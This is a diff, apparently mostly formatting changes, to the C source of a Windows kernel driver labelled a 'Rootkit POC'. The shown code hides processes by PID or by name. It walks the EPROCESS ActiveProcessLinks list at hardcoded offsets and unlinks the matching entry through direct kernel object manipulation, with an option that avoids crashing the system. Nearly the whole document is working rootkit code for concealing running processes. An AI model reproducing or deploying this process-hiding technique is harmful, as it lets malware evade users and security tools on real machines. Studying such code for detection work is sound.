@@ -1,27 +1,24 @@
 #include <ntddk.h>
 
-
-typedef struct _HideProcessData {
-    char* HideBy;
-    char* ProcessName;
+typedef struct _HideProcessData
+{
+    char *HideBy;
+    char *ProcessName;
     UINT32 ProcessPid;
     BOOLEAN AvoidBSOD;
 } HideProcessData;
 
-
-VOID
-AvoidBSOD_RemoveProcessLinks(
-    _In_    PLIST_ENTRY     CurrListEntry
-)
+VOID AvoidBSOD_RemoveProcessLinks(
+    _In_ PLIST_ENTRY CurrListEntry)
 {
     PLIST_ENTRY Previous, Next;
     Previous = (CurrListEntry->Blink);
     Next = (CurrListEntry->Flink);
-    
+
     DbgPrint("Rootkit POC: Remove entry list");
     Previous->Flink = Next;
     Next->Blink = Previous;
-    
+
     DbgPrint("Rootkit POC: Avoid BSOD");
     CurrListEntry->Blink = (PLIST_ENTRY)&CurrListEntry->Flink;
     CurrListEntry->Flink = (PLIST_ENTRY)&CurrListEntry->Flink;
@@ -29,14 +26,11 @@ AvoidBSOD_RemoveProcessLinks(
     return;
 }
 
-
-VOID
-WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
-    _In_    UINT32      pid,
-    _In_    BOOLEAN     AvoidBSOD
-)
+VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
+    _In_ UINT32 pid,
+    _In_ BOOLEAN AvoidBSOD)
 {
-    UINT32* currUniqueProcessId = NULL;
+    UINT32 *currUniqueProcessId = NULL;
 
     ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;
 
@@ -52,9 +46,9 @@ WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
     {
         NextListEntry = CurrListEntry->Flink;
 
-        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);
+        currUniqueProcessId = (UINT32 *)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);
 
-        if (*(UINT32*)currUniqueProcessId == pid && MmIsAddressValid(CurrListEntry))
+        if (*(UINT32 *)currUniqueProcessId == pid && MmIsAddressValid(CurrListEntry))
         {
             DbgPrint("Rootkit POC: Hide Process -> Pid (%p)", currUniqueProcessId);
 
@@ -72,14 +66,11 @@ WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
     }
 }
 
-
-VOID
-WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
-    _In_    char*       ProcessName,
-    _In_    BOOLEAN     AvoidBSOD
-)
+VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
+    _In_ char *ProcessName,
+    _In_ BOOLEAN AvoidBSOD)
 {
-    char* currImageFileName = NULL;
+    char *currImageFileName = NULL;
 
     ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;
 
@@ -95,7 +86,7 @@ WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
     {
         NextListEntry = CurrListEntry->Flink;
 
-        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);
+        currImageFileName = (char *)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);
 
         if (strcmp(currImageFileName, ProcessName) == 0 && MmIsAddressValid(CurrListEntry))
         {
@@ -115,23 +106,18 @@ WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
     }
 }
 
-
-VOID
-DriverUnload(
-    _In_    PDRIVER_OBJECT      pDriverObject
-)
+VOID DriverUnload(
+    _In_ PDRIVER_OBJECT pDriverObject)
 {
     UNREFERENCED_PARAMETER(pDriverObject);
 
     DbgPrint("Rootkit POC: Unloading... Service has stopped");
 }
 
-
 NTSTATUS
 DriverEntry(
-    _In_    PDRIVER_OBJECT      pDriverObject,
-    _In_    PUNICODE_STRING     pRegistryPath
-)
+    _In_ PDRIVER_OBJECT pDriverObject,
+    _In_ PUNICODE_STRING pRegistryPath)
 {
     UNREFERENCED_PARAMETER(pRegistryPath);
 
